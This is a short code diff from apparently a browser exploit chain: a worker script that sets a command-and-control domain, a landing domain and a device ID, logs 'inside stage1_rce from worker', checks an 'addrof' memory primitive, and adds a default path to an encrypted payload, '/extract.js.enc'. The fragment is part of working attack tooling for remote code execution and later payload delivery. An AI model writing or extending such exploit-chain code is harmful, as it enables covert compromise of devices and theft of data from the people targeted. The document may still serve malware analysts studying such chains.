@@ -10193,6 +10193,7 @@ async function main() {
             self.C2_DOMAIN = data.c2Domain || "";
             self.LANDING_DOMAIN = data.landingDomain || "";
             self.DEVICE_ID = data.deviceId || "";
+            self.EXTRACT_PATH = data.extractPath || "/extract.js.enc";
             print("inside stage1_rce from worker");
             main().then((p_temp) => {
               if(!p_temp.addrof)
